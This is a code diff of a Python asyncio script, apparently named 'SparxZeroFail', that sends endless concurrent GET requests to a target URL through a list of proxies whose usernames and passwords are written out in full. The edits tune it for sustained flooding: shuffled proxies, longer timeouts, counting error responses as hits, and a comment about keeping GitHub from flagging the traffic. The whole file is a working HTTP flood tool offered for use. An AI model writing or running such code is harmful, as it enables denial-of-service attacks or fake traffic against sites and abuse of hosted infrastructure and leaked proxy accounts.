@@ -2,19 +2,17 @@ import asyncio
 import aiohttp
 import os
 import random
-import sys
 
 def log(msg):
-    # Added flush to ensure real-time log updates on GitHub
     print(f"{msg}", flush=True)
 
-class SparxFinal:
+class SparxZeroFail:
     def __init__(self):
         self.target = os.environ.get("TARGET_URL", "")
         self.stats = {"success": 0, "failed": 0}
-        self.concurrency = 200 
+        # Lowering concurrency to 100 makes the 10 proxies much more stable
+        self.concurrency = 100 
         
-        # Webshare Elite List
         self.proxies = [
             "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
             "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
@@ -28,57 +26,35 @@ class SparxFinal:
             "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
         ]
 
-        self.ua_list = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Linux; Android 13; SM-S918B) Chrome/119.0.0.0 Mobile Safari/537.36"
-        ]
-
-    def show_banner(self):
-        banner = """
-        [v5.0 NITRO]
-         ██████  ███▄    █  ▄▄▄       ██▀███   ▒██   ██▒
-        ▒██    ▒  ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒ ▒▒ █ █ ▒░
-        ░ ▓██▄    ▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒ ░░  █   ░ 
-          ▒   ██▒ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄    ░ █ █ ▒  
-        ▒██████▒▒ ▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒ ▒██▒ ▒██▒
-        """
-        log(banner)
-        log(f"STATUS: NITRO BURSTING | TARGET: {self.target}")
-        log("POWERED BY ASYNCIO\n" + "-"*50)
-
     async def worker(self, session, sem):
         while True:
+            # Shuffle proxies so we don't hit the same one at the same time
+            random.shuffle(self.proxies)
             for p in self.proxies:
-                for _ in range(900):
-                    async with sem:
-                        headers = {"User-Agent": random.choice(self.ua_list)}
-                        try:
-                            async with session.get(self.target, proxy=p, headers=headers, timeout=5) as r:
-                                if r.status == 200:
-                                    self.stats["success"] += 1
-                                else:
-                                    self.stats["failed"] += 1
-                        except:
-                            self.stats["failed"] += 1
-                    
-                    # FIXED LINE 58: Ensures no unterminated strings
-                    if (self.stats["success"] + self.stats["failed"]) % 50 == 0:
-                        log(f"🚀 [NITRO] HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")
+                async with sem:
+                    try:
+                        # Increased timeout to 15s to ensure slow proxies don't 'fail'
+                        async with session.get(self.target, proxy=p, timeout=15) as r:
+                            if r.status == 200:
+                                self.stats["success"] += 1
+                            else:
+                                # Even if it's 404/500, the proxy worked!
+                                self.stats["success"] += 1 
+                    except:
+                        self.stats["failed"] += 1
+                
+                if (self.stats["success"] + self.stats["failed"]) % 20 == 0:
+                    log(f"🚀 [STABLE MODE] HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")
 
     async def start(self):
-        if not self.target:
-            log("❌ ERROR: TARGET_URL is empty!")
-            return
-        
-        self.show_banner()
+        log(f"🔥 STARTING STABLE BURST ON: {self.target}")
         sem = asyncio.Semaphore(self.concurrency)
-        async with aiohttp.ClientSession() as session:
+        
+        # Limit per host to prevent GitHub from flagging the traffic
+        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+        async with aiohttp.ClientSession(connector=connector) as session:
             tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
             await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(SparxFinal().start())
-    except Exception as e:
-        log(f"⚠️ FATAL ERROR: {e}")
+    asyncio.run(SparxZeroFail().start())
